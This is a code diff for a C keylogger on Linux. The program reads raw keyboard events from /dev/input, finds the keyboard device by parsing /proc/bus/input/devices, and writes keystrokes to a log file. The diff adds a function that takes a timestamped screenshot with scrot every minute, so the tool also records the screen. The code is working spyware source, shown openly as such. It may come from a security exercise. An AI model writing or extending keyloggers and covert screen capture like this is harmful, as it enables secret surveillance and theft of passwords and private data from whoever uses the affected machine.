@@ -7,6 +7,7 @@
 #include <stdlib.h>
 #include <errno.h>
 #include <xkbcommon/xkbcommon.h>
+#include <time.h>
 
 #define LOGFILEPATH "/home/seguridad/keylogger.txt"
 
@@ -159,7 +160,28 @@ const char *key_table[] = {
     [KEY_CAPSLOCK] = "[CAPSLOCK]",
 };
 
+//Función para tomar capturas cada minuto
+
+void takeScreenshot() {
+    // Obtener la hora actual
+    time_t rawtime;
+    struct tm *timeinfo;
+    char timestamp[80];
+
+    time(&rawtime);
+    timeinfo = localtime(&rawtime);
+
+    strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", timeinfo);
+
+    // Tomar la captura de pantalla y guardarla con la marca de tiempo
+    char command[100];
+    sprintf(command, "scrot /home/seguridad/screenshots/%s.png", timestamp);
+    system(command);
+}
+
+
 int main() {
+    
     struct input_event ev;
     // ruta al directorio de inputs
     static char path_keyboard[20] = "/dev/input/";
@@ -180,6 +202,7 @@ int main() {
         printf("Error: %d\n", errno);
         return 1;
     }
+    time_t last_screenshot_time = 0;
 
     while (1) {
         read(device_keyboard, &ev, sizeof(ev));
@@ -190,6 +213,14 @@ int main() {
                 fflush(fp);  // Asegura que los datos se escriban en el archivo inmediatamente
             }
         }
+        // Tomar una captura de pantalla cada minuto
+        time_t current_time = time(NULL);
+        if (current_time - last_screenshot_time >= 60) {
+            takeScreenshot();
+            last_screenshot_time = current_time;
+        }
+
+        
     }
 
     fclose(fp);
@@ -198,16 +229,14 @@ int main() {
 }
 
 char *getEvent() {
-    // leer el fichero devices y extraer el input que se refiera al teclado
     char *command = (char *) "cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
     static char event[8];
     FILE *pipe = popen(command, "r");
     if (!pipe) {
         exit(1);
     }
-    // obtener la cadena de texto del evento correspondiente al teclado
     fgets(event, 8, pipe);
     pclose(pipe);
-    // retornar el evento
     return event;
 }
+
